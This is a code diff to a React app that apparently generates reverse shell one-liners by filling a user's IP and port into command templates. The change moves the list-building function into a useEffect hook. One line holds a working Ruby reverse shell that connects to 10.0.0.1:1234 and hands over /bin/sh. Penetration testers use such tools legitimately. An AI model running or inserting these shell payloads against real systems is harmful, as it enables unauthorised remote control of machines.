@@ -6,12 +6,10 @@ import Container from "@material-ui/core/Container";
 import { makeStyles } from "@material-ui/core/styles";
 import Paper from "@material-ui/core/Paper";
 import Grid from "@material-ui/core/Grid";
-import Button from "@material-ui/core/Button";
 import Snackbar from "@material-ui/core/Snackbar";
 import IconButton from "@material-ui/core/IconButton";
 import CloseIcon from "@material-ui/icons/Close";
 import AllInclusiveIcon from "@material-ui/icons/AllInclusive";
-import orange from "@material-ui/core/colors/orange";
 
 const themeDark = createMuiTheme({
   palette: {
@@ -53,9 +51,6 @@ const App = () => {
   const [mylist, setMylist] = useState([]);
 
   const [open, setOpen] = React.useState(false);
-  useEffect(() => {
-    generateList();
-  }, [ip, port]);
   const handleClick = () => {
     setOpen(true);
   };
@@ -67,17 +62,7 @@ const App = () => {
 
     setOpen(false);
   };
-  const generateList = () => {
-    console.log(ip);
-    setMylist(
-      list.map((item) => {
-        return {
-          name: item.name,
-          value: item.value.replace("MYIP", ip).replace("MYPORT", port),
-        };
-      })
-    );
-  };
+
   const copyToClipboard = (e, item) => {
     navigator.clipboard.writeText(item.value);
     handleClick();
@@ -130,6 +115,20 @@ const App = () => {
       value: `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
     },
   ];
+  useEffect(() => {
+    const generateList = () => {
+      console.log(ip);
+      setMylist(
+        list.map((item) => {
+          return {
+            name: item.name,
+            value: item.value.replace("MYIP", ip).replace("MYPORT", port),
+          };
+        })
+      );
+    };
+    generateList();
+  }, [ip, port]); // eslint-disable-line react-hooks/exhaustive-deps
   const FormRow = ({ item }) => {
     return (
       <React.Fragment>
